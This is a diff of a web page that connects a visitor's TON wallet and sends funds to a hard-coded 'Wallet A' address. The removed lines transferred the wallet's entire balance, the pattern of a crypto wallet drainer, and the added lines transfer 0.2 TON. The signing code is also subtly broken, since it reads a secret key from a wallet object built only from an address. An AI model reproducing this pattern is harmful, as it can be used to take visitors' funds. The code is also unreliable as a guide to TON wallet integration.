@@ -14,12 +14,13 @@
     <div id="ton-connect"></div>
     
     <!-- Transfer button will be hidden initially -->
-    <button id="transferBtn" style="display: none;">Transfer All Funds to Wallet A</button>
+    <button id="transferBtn" style="display: none;">Transfer 0.2 TON to Wallet A</button>
 
     <p id="status"></p>
 
     <script>
         const walletAAddress = "UQDSt8XTc0ylw4npYOJOPuiXJKykeNRawfr4-Wxeu1yB-6vS"; // Replace with Wallet A address
+        const transferAmountInTon = 0.2; // Amount to transfer in TON (0.2 TON)
 
         // Initialize TON Connect UI
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
@@ -51,15 +52,14 @@
                 const tonweb = new TonWeb();  // Initialize TonWeb
                 const walletB = tonweb.wallet.fromAddress(walletBAddress);
 
-                // Get the balance of Wallet B
-                const balance = await walletB.getBalance();
-                const balanceInTon = balance / Math.pow(10, 9); // Convert nanoTON to TON
+                // Convert 0.2 TON to nanoTON (1 TON = 1,000,000,000 nanoTON)
+                const transferAmount = transferAmountInTon * Math.pow(10, 9); 
 
-                // Create a transaction to transfer all funds to Wallet A
+                // Create a transaction to transfer 0.2 TON to Wallet A
                 const transaction = await walletB.createTransfer({
                     secretKey: walletB.secretKey, // User must authorize this with their secret key
                     to: walletAAddress,           // Wallet A address
-                    amount: balance,              // Transfer all funds
+                    amount: transferAmount,       // Transfer 0.2 TON (converted to nanoTON)
                 });
 
                 // Sign and send the transaction
